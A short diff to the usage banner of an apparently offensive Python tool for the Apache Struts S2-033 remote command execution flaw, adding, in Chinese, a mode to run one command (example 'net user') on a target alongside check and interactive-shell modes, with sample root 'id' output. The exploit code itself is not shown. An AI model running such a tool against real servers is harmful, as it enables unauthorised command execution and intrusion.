@@ -14,6 +14,8 @@ banner = u'''\
     python S2-033_CmdToolExP.py -u http://xxx.xxx.xxx.xxx/xx/ -check yes
   2、交互式执行命令
     python S2-033_CmdToolExP.py -u http://xxx.xxx.xxx.xxx/xx/ -shell yes
+  3、执行一条命令：在无交互式环境或不方便查看回显数据时使用
+    python S2-033_CmdToolExP.py -u http://xxx.xxx.xxx.xxx/xx/ -command "net user "
 # ~$ id
 # ======================================================
 # uid=0(root) gid=0(root) groups=0(root)
